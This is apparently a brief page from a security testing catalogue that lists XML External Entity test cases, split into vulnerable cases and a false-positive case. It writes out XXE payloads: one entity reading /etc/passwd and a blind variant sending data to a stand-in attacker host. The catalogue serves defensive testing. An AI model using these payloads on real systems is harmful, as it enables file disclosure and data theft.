XML External Entity (XXE)

XXE attacks exploit XML parsers that process external entity references, potentially allowing file disclosure, SSRF, or denial of service.

Vulnerable Test Cases

  • Basic XXE - XML parsed with external entities
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  • Blind XXE - No output shown (out-of-band exfiltration)
    <!ENTITY xxe SYSTEM "http://attacker.com/?data=...">
  • XXE via Upload - Upload XML file with entities

False Positives (Safe)

  • External Entities Disabled - DTD and entities rejected
